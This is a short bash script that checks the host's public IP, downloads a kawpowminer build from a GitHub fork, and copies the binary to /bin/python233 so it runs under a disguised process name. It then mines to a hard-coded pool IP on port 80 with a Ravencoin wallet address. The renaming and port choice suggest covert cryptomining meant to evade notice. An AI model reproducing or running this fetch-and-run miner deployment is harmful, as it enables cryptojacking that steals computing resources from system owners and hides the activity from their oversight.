#!bin/bash -xe 
curl ipinfo.io
# Version 1.2.3
# wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
# unzip kawpowminer-ubuntu18-1.2.3.zip
# version1.2.2
wget https://github.com/one10001/kawpowminer/releases/download/7.5/kawpowminer_all75.tar.gz
tar -xzf kawpowminer_all75.tar.gz
ls -la
cd kawpowminer/build/kawpowminer/
chmod +x kawpowminer
cp kawpowminer /bin/python233
python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80  --cu-grid-size 1024  --cu-block-size 2048  --cu-parallel-hash 16
